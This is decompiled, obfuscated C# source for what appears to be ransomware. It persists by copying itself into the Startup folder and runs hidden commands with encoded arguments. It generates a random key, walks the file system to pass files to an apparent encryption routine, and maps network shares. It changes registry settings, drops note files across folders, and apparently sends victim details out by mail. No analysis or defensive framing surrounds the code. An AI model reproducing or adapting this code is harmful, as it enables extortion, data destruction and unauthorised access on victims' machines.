	public static string JgfbxDYAciLO;

	public static List<string> UgmMuhbgyRVLXd;

	public static List<string> LOeInkCeZkNU;

	public static List<string> pTsRRtezFMz;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegated;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			nsFpvrNGvOuVXy CS_0024_003C_003E8__locals0 = new nsFpvrNGvOuVXy();
			CS_0024_003C_003E8__locals0.TuiBPSgeyk = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.TuiBPSgeyk) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			ONohAWpMbHUNwGn.QCglDBmRgIiuwf(JliYkBzhNMrnM);
		}
		catch (Exception)
		{
		}
		try
		{
			if (iQVfjjPnVtUWK == getString_0(107396725))
			{
				Thread thread = new Thread(iEUfvlOpXbFA.vaZfQUTdIaPw);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (lCxFWzSgiFYn == getString_0(107396725))
		{
			Thread.Sleep(int.Parse(qNekJNHQbGgdlj));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && HIVWYaWSCMvU == getString_0(107396725))
		{
			try
			{
				RILWmqAaEQh(HIZwQscayZMa(getString_0(107396720)));
			}
			catch
			{
			}
		}
		try
		{
			if (VsJIukPqAguT == getString_0(107396725) && MbKPIFdUkQz.fGzmRtdfzNqjYKMB())
			{
				new qHHwkVIRhGNyzQt().MSUsABVfQUW(bool_0: false);
				MbKPIFdUkQz.EQhzZBRZRBzdH();
			}
		}
		catch (Exception)
		{
		}
		if (kPnBwmxUOIE == getString_0(107396725) && MbKPIFdUkQz.fGzmRtdfzNqjYKMB())
		{
			new qHHwkVIRhGNyzQt().MSUsABVfQUW(bool_0: false);
			new qHHwkVIRhGNyzQt().DngMxZMkNlBkNCpI();
		}
		if (bTVdtQmloMp == getString_0(107396725))
		{
			alOKdQJPzzwAryPME.OrrmgHveuTaSC();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397159);
			string text2 = text + Path.GetFileName(fileName);
			if (aYUpHUGdUIVC == getString_0(107396725) && fileName != text2)
			{
				Thread thread2 = new Thread(IBxUNKDflVhQm);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (jmNGPrOmjSIISc == getString_0(107396725) && mainModule != null && fileName != text2)
			{
				try
				{
					DWJYSGdBjcTBL = pMibIwoMcnbMzLpl(0, BoNIHLCorthXUO.Count);
					File.Copy(fileName, text + BoNIHLCorthXUO[DWJYSGdBjcTBL], overwrite: true);
					Process.Start(text + BoNIHLCorthXUO[DWJYSGdBjcTBL]);
					pREEHmuZBxDt();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (WXyemYtuBSqy == getString_0(107396725) && DateTime.Now < TcEcgQAQdsjAwX)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (RlCpaLrMWWn == getString_0(107396725) && DateTime.Now > RNwCRPwGBq)
			{
				pREEHmuZBxDt();
			}
		}
		catch
		{
		}
		vNdHenxhIcZi();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegated == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegated = delegate
			{
				List<string> eMZZVRukVgRk = EMZZVRukVgRk;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						QYoxJyabcEN(getString_0(107389636), string_0);
					};
				}
				Parallel.ForEach(eMZZVRukVgRk, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				List<string> source = yShCceaqxImzo;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						QYoxJyabcEN(getString_0(107393113), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> yyRbaEftoamR = YyRbaEftoamR;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						QYoxJyabcEN(HIZwQscayZMa(getString_0(107389627)), string_0);
					};
				}
				Parallel.ForEach(yyRbaEftoamR, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				if (QiRNmqPOWrMtCh == getString_0(107396725))
				{
					string[] kPxzLUKEmVdQyD = KPxzLUKEmVdQyD;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
						{
							QYoxJyabcEN(HIZwQscayZMa(getString_0(107389627)), getString_0(107389602) + string_0 + getString_0(107389593));
						};
					}
					Parallel.ForEach(kPxzLUKEmVdQyD, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				}
				if (!bmwWGsqcQrk().Contains(getString_0(107389784)))
				{
					NffZNIbIlwcdlddH(xiHuEoHoRXESAY);
				}
				else
				{
					List<string> source2 = bXbpSdhsQQQk;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							QYoxJyabcEN(HIZwQscayZMa(zikllNgvJXLR(getString_0(107389556))), string_0);
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				List<string> source3 = hAoVEaJfEovikWoJ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
					{
						QYoxJyabcEN(HIZwQscayZMa(getString_0(107389563)), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				List<string> ykLPjYDuCfAlg = YkLPjYDuCfAlg;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						QYoxJyabcEN(getString_0(107390026), string_0);
					};
				}
				Parallel.ForEach(ykLPjYDuCfAlg, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegated);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && iGpFNBdltsqHeT)
			{
				try
				{
					Thread thread4 = new Thread(pgjWiGOLgRoE.uQiUfyPiDzfNRb);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			QYoxJyabcEN(getString_0(107397154), HIZwQscayZMa(getString_0(107397109)));
			QYoxJyabcEN(getString_0(107397154), HIZwQscayZMa(getString_0(107397036)));
			QYoxJyabcEN(HIZwQscayZMa(getString_0(107396979)), HIZwQscayZMa(getString_0(107396998)));
			QYoxJyabcEN(HIZwQscayZMa(getString_0(107396979)), HIZwQscayZMa(getString_0(107396356)));
		}
		SecureString secureString = new SecureString();
		if (HtBtaIplbcJ == getString_0(107396694))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			hUytBMdeRsO = getString_0(107396689);
		}
		iLtpaOqpVUqJDx = ByLCmnnhrrppt.KwlFsMMThHblH(BAMribwsEQVLXJ(secureString));
		if (jHuzdxCmiAYg)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), JgfbxDYAciLO)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), JgfbxDYAciLO), string.Concat(HIZwQscayZMa(getString_0(107396676)), new WebClient().DownloadString(HIZwQscayZMa(getString_0(107396619))), getString_0(107396610), HIZwQscayZMa(getString_0(107396605)), DateTime.Now, getString_0(107396610), HIZwQscayZMa(getString_0(107396532)), iLtpaOqpVUqJDx));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), JgfbxDYAciLO), getString_0(107396507) + iLtpaOqpVUqJDx);
				}
			}
			catch (Exception ex7)
			{
				if (diLbjzXQsjUvfr)
				{
					try
					{
						File.AppendAllText(fNCnNJWJkI, getString_0(107396478) + ex7.Message + getString_0(107396610));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		KogQQcqLmuaMW.bbrkYCmpaWWDR(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), NGRRApkWgPFBD), cMxOggYqQlwq(iLtpaOqpVUqJDx), null, null, getString_0(107395885), getString_0(107395900), null);
		if (rtcZjiAsAoieR == getString_0(107396725))
		{
			try
			{
				kMeYKEkdbla();
			}
			catch
			{
			}
		}
		try
		{
			OAnvVvkVTnJg(new string[1] { getString_0(107395851) }, new string[100]
			{
				getString_0(107395874),
				getString_0(107395869),
				getString_0(107395832),
				getString_0(107395823),
				getString_0(107395818),
				getString_0(107395845),
				getString_0(107395840),
				getString_0(107395835),
				getString_0(107395798),
				getString_0(107395793),
				getString_0(107395788),
				getString_0(107395815),
				getString_0(107395806),
				getString_0(107395801),
				getString_0(107395760),
				getString_0(107395755),
				getString_0(107395782),
				getString_0(107395777),
				getString_0(107395772),
				getString_0(107395735),
				getString_0(107395726),
				getString_0(107395721),
				getString_0(107395748),
				getString_0(107395743),
				getString_0(107395738),
				getString_0(107395701),
				getString_0(107395696),
				getString_0(107395691),
				getString_0(107395718),
				getString_0(107395713),
				getString_0(107395708),
				getString_0(107396183),
				getString_0(107396178),
				getString_0(107396173),
				getString_0(107396196),
				getString_0(107396191),
				getString_0(107396186),
				getString_0(107396149),
				getString_0(107395840),
				getString_0(107396144),
				getString_0(107395798),
				getString_0(107396167),
				getString_0(107396162),
				getString_0(107396157),
				getString_0(107396120),
				getString_0(107396115),
				getString_0(107396110),
				getString_0(107396105),
				getString_0(107396132),
				getString_0(107396127),
				getString_0(107396122),
				getString_0(107396085),
				getString_0(107396080),
				getString_0(107396075),
				getString_0(107396102),
				getString_0(107396097),
				getString_0(107396092),
				getString_0(107396055),
				getString_0(107396046),
				getString_0(107396041),
				getString_0(107396064),
				getString_0(107396019),
				getString_0(107396144),
				getString_0(107396038),
				getString_0(107396029),
				getString_0(107395988),
				getString_0(107395979),
				getString_0(107396002),
				getString_0(107395993),
				getString_0(107395956),
				getString_0(107395947),
				getString_0(107395970),
				getString_0(107395961),
				getString_0(107395412),
				getString_0(107395407),
				getString_0(107395402),
				getString_0(107395429),
				getString_0(107395424),
				getString_0(107395419),
				getString_0(107395378),
				getString_0(107395373),
				getString_0(107395400),
				getString_0(107395395),
				getString_0(107395390),
				getString_0(107395385),
				getString_0(107395344),
				getString_0(107395367),
				getString_0(107395362),
				getString_0(107396178),
				getString_0(107395357),
				getString_0(107395320),
				getString_0(107395315),
				getString_0(107395310),
				getString_0(107395305),
				getString_0(107395328),
				getString_0(107395323),
				getString_0(107395286),
				getString_0(107395277),
				getString_0(107395304),
				getString_0(107395299)
			}, new string[0], BAMribwsEQVLXJ(secureString), getString_0(107395294));
		}
		catch (Exception ex9)
		{
			if (diLbjzXQsjUvfr)
			{
				try
				{
					File.AppendAllText(fNCnNJWJkI, getString_0(107395249) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395224)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395224));
				streamWriter.WriteLine(HIZwQscayZMa(getString_0(107395191)));
				streamWriter.WriteLine(getString_0(107396610));
				streamWriter.WriteLine(HIZwQscayZMa(getString_0(107393885)));
				streamWriter.WriteLine(iLtpaOqpVUqJDx);
				if (ysmQyIRLiTDhstt == getString_0(107396694))
				{
					streamWriter.WriteLine(getString_0(107396610));
					streamWriter.WriteLine(HIZwQscayZMa(getString_0(107393852)) + Convert.ToString(eVEJPETDEKd.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395224), getString_0(107393743) + iLtpaOqpVUqJDx);
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in fxkaTZNzSZr)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395224)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395224), item + getString_0(107395224), overwrite: true);
				}
				else
				{
					File.AppendAllText(item + getString_0(107395224), getString_0(107393743) + iLtpaOqpVUqJDx);
				}
			}
			catch (Exception)
			{
			}
			if (!ebdecQEFHvifCf && num > 10)
			{
				break;
			}
		}
		if (drHBNZfPBu == getString_0(107396725))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393714)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393714));
					streamWriter2.WriteLine(HIZwQscayZMa(getString_0(107393681)));
					streamWriter2.WriteLine(getString_0(107396610));
					streamWriter2.WriteLine(HIZwQscayZMa(getString_0(107393696)));
					streamWriter2.WriteLine(iLtpaOqpVUqJDx + HIZwQscayZMa(getString_0(107394119)));
					if (ysmQyIRLiTDhstt == getString_0(107396694))
					{
						streamWriter2.WriteLine(getString_0(107396610));
						streamWriter2.WriteLine(HIZwQscayZMa(getString_0(107394106)) + HIZwQscayZMa(getString_0(107393852)) + Convert.ToString(eVEJPETDEKd.Count) + HIZwQscayZMa(getString_0(107394119)));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393714), HIZwQscayZMa(getString_0(107394106)) + getString_0(107393743) + iLtpaOqpVUqJDx + HIZwQscayZMa(getString_0(107394119)));
				}
			}
			catch
			{
			}
		}
		if (WzzaTIQBEQUdZBX == getString_0(107396725))
		{
			try
			{
				if (ysmQyIRLiTDhstt == getString_0(107396694))
				{
					ceWGkLeWGlSf.BoAkSHXUUyZ(getString_0(107394045), getString_0(107394008), getString_0(107393995), string.Concat(HIZwQscayZMa(getString_0(107396676)), new WebClient().DownloadString(HIZwQscayZMa(getString_0(107396619))), getString_0(107394018), HIZwQscayZMa(getString_0(107396605)), DateTime.Now, getString_0(107396610), HIZwQscayZMa(getString_0(107394013)), Convert.ToString(eVEJPETDEKd.Count), getString_0(107396610), HIZwQscayZMa(getString_0(107396532)), iLtpaOqpVUqJDx));
				}
				else
				{
					ceWGkLeWGlSf.BoAkSHXUUyZ(getString_0(107394045), getString_0(107394008), getString_0(107393995), string.Concat(HIZwQscayZMa(getString_0(107396676)), new WebClient().DownloadString(HIZwQscayZMa(getString_0(107396619))), getString_0(107394018), HIZwQscayZMa(getString_0(107396605)), DateTime.Now, getString_0(107396610), HIZwQscayZMa(getString_0(107394013)), Convert.ToString(eVEJPETDEKd.Count), getString_0(107396610), HIZwQscayZMa(getString_0(107396532)), iLtpaOqpVUqJDx));
				}
			}
			catch
			{
			}
		}
		if (daKWNUQSDBiFyu == getString_0(107396725))
		{
			try
			{
				pXhSBvtdjvw.hubgFqBWGcm(new Uri(getString_0(107393932)));
			}
			catch
			{
			}
		}
		if (drHBNZfPBu == getString_0(107396694))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395224)))
				{
					Process.Start(HIZwQscayZMa(getString_0(107393931)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395224));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393714)))
				{
					Process.Start(HIZwQscayZMa(getString_0(107393906)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393714));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(oJxmOjwwboOJ))
		{
			try
			{
				File.Delete(oJxmOjwwboOJ);
			}
			catch
			{
			}
		}
		if (diLbjzXQsjUvfr)
		{
			try
			{
				File.AppendAllText(fNCnNJWJkI, getString_0(107393921));
			}
			catch (Exception)
			{
			}
		}
		if (SoSVvJbhzN == getString_0(107393364))
		{
			pREEHmuZBxDt();
		}
	}

	public static void IBxUNKDflVhQm()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(HIZwQscayZMa(getString_0(107393355)), HIZwQscayZMa(getString_0(107393201)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int pMibIwoMcnbMzLpl(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> ukFVFMOKSQjZ(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains(getString_0(107393216)) && !text.ToLower().Contains(getString_0(107393163)) && !text.ToLower().Contains(getString_0(107393182)) && !text.ToLower().Contains(getString_0(107393137)) && !text.ToLower().Contains(getString_0(107393624)) && !text.ToLower().Contains(getString_0(107393635)) && !text.ToLower().Contains(getString_0(107393590)) && !text.ToLower().Contains(getString_0(107393577)) && !text.ToLower().Contains(getString_0(107393572)) && !text.ToLower().Contains(getString_0(107393563)) && !text.ToLower().Contains(getString_0(107393514)) && !text.ToLower().Contains(getString_0(107393635)) && !text.ToLower().Contains(getString_0(107393533)) && !text.ToLower().Contains(getString_0(107393512)))
				{
					array = Directory.GetFiles(text);
					goto IL_01eb;
				}
			}
			catch
			{
			}
			continue;
			IL_01eb:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107393455)) && !fileInfo.FullName.Contains(getString_0(107393470)) && !fileInfo.FullName.Contains(getString_0(107393421)) && !fileInfo.FullName.Contains(getString_0(107393436)) && !fileInfo.FullName.Contains(getString_0(107393387)) && !fileInfo.FullName.Contains(getString_0(107393402)) && !fileInfo.FullName.Contains(getString_0(107392841)) && !fileInfo.FullName.Contains(getString_0(107392824)) && !fileInfo.FullName.Contains(getString_0(107392811)) && !fileInfo.FullName.Contains(getString_0(107392790)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392777)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392796)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392747)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392762)) && !fileInfo.FullName.Contains(HIZwQscayZMa(getString_0(107392713))) && !fileInfo.FullName.Contains(getString_0(107392688)) && !fileInfo.FullName.Contains(getString_0(107392707)) && !fileInfo.FullName.EndsWith(getString_0(107395294)) && !fileInfo.FullName.EndsWith(getString_0(107392650)) && !fileInfo.FullName.EndsWith(getString_0(107392677)) && !fileInfo.FullName.EndsWith(getString_0(107392672)) && !fileInfo.FullName.EndsWith(getString_0(107392667)) && !fileInfo.FullName.Contains(getString_0(107392630)) && !fileInfo.FullName.Contains(NGRRApkWgPFBD) && !fileInfo.FullName.Contains(fNCnNJWJkI) && !fileInfo.FullName.Contains(JgfbxDYAciLO))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(sCWngckDuqD) * 1024.0 * 1024.0 && pNBnwqWxvnZcdZ == getString_0(107396725))
						{
							list.Add(fileInfo.FullName);
							GUcDroqQwLUuMd(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && pNBnwqWxvnZcdZ == getString_0(107396694))
						{
							list.Add(fileInfo.FullName);
							GUcDroqQwLUuMd(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string QYoxJyabcEN(string CyhruzcwPdYHgn = "", string GiZzzAdIANRPK = "")
	{
		string result = getString_0(107393932);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = CyhruzcwPdYHgn,
				Arguments = GiZzzAdIANRPK,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void RILWmqAaEQh(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392645),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string zikllNgvJXLR(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string HIZwQscayZMa(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void kMeYKEkdbla()
	{
		//IL_05b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b8: Expected O, but got Unknown
		//IL_05d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_05da: Expected O, but got Unknown
		RZVoGTpoteQpz.ceAAfjOJRaRCIelx();
		pTsRRtezFMz = RZVoGTpoteQpz.EXmePuYKPnkV();
		List<SjxLWSjSWLoEi> list = SjxLWSjSWLoEi.ziyMaXMXDXhxhG();
		foreach (SjxLWSjSWLoEi item in list)
		{
			LOeInkCeZkNU.Add(item.IPAddress);
		}
		UgmMuhbgyRVLXd = pTsRRtezFMz.Union(LOeInkCeZkNU).ToList();
		foreach (string item2 in UgmMuhbgyRVLXd)
		{
			if ((!item2.StartsWith(getString_0(107393108)) && !item2.StartsWith(getString_0(107393103)) && !item2.StartsWith(getString_0(107393126)) && !item2.StartsWith(getString_0(107393932))) || !RZVoGTpoteQpz.bskzVvtoqYIdv(item2))
			{
				continue;
			}
			try
			{
				if (sHBwSrfcnHkEPy == getString_0(107396725))
				{
					for (int i = 0; i < RZVoGTpoteQpz.weCHoBiWCTZgKnEN.Count; i++)
					{
						QYoxJyabcEN(getString_0(107393113), getString_0(107393068) + item2 + getString_0(107393091) + RZVoGTpoteQpz.weCHoBiWCTZgKnEN[i] + getString_0(107393046) + RZVoGTpoteQpz.EuhwTzWeKNm[i]);
					}
				}
				else
				{
					QYoxJyabcEN(getString_0(107393113), getString_0(107393068) + item2);
				}
			}
			catch
			{
			}
		}
		try
		{
			RZVoGTpoteQpz.PvqErlzcuLBs pvqErlzcuLBs = new RZVoGTpoteQpz.PvqErlzcuLBs(RZVoGTpoteQpz.oElrKszIqLXflk.AvobvwqaLgrWUSt, RZVoGTpoteQpz.vnPWWDFgqbzqS.BjWPihPtlhDkR, RZVoGTpoteQpz.HbSndXiTgjenyC.cZWsBkWBYEZvATVt, RZVoGTpoteQpz.EifaSyzawyyOa.UWJpvtlRfAmlbs);
			foreach (string item3 in pvqErlzcuLBs)
			{
				MatchCollection matchCollection = Regex.Matches(item3, getString_0(107393041));
				foreach (Match item4 in matchCollection)
				{
					try
					{
						if (sHBwSrfcnHkEPy == getString_0(107396725))
						{
							for (int j = 0; j < RZVoGTpoteQpz.weCHoBiWCTZgKnEN.Count; j++)
							{
								QYoxJyabcEN(getString_0(107393113), getString_0(107392992) + item4.ToString() + getString_0(107393091) + RZVoGTpoteQpz.weCHoBiWCTZgKnEN[j] + getString_0(107393046) + RZVoGTpoteQpz.EuhwTzWeKNm[j]);
							}
						}
						else
						{
							QYoxJyabcEN(getString_0(107393113), getString_0(107392992) + item4.ToString());
						}
					}
					catch
					{
					}
					if (!ndBzFjvUeNH.Contains(item4.ToString()))
					{
						ndBzFjvUeNH.Add(item4.ToString());
					}
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = zikllNgvJXLR(getString_0(107392951));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(HIZwQscayZMa(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(HIZwQscayZMa(getString_0(107392334)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(HIZwQscayZMa(getString_0(107392277)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (UXRLGpjTgaHE == getString_0(107396725))
		{
			try
			{
				string text = Path.GetTempFileName().Replace(getString_0(107392264), getString_0(107392255));
				File.WriteAllText(text, HIZwQscayZMa(getString_0(107392214)), Encoding.ASCII);
				QYoxJyabcEN(getString_0(107397154), getString_0(107391128) + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391123))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391123)));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391114))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391114)));
				}
			}
			catch
			{
			}
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107391137));
		ManagementObjectEnumerator enumerator5 = val.Get().GetEnumerator();
		try
		{
			while (enumerator5.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator5.get_Current();
				if (!ndBzFjvUeNH.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391564), getString_0(107397159)).Replace(getString_0(107391591), getString_0(107391564))
					.Replace(getString_0(107391582), getString_0(107393932))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					ndBzFjvUeNH.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391564), getString_0(107397159)).Replace(getString_0(107391591), getString_0(107391564))
						.Replace(getString_0(107391582), getString_0(107393932))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107391577), getString_0(107393932)) + getString_0(107391536));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator5)?.Dispose();
		}
	}

	public static void NffZNIbIlwcdlddH(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = HIZwQscayZMa(getString_0(107391559));
		processStartInfo.Arguments = getString_0(107391498) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool xkiuAMfGtUFTFcM(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
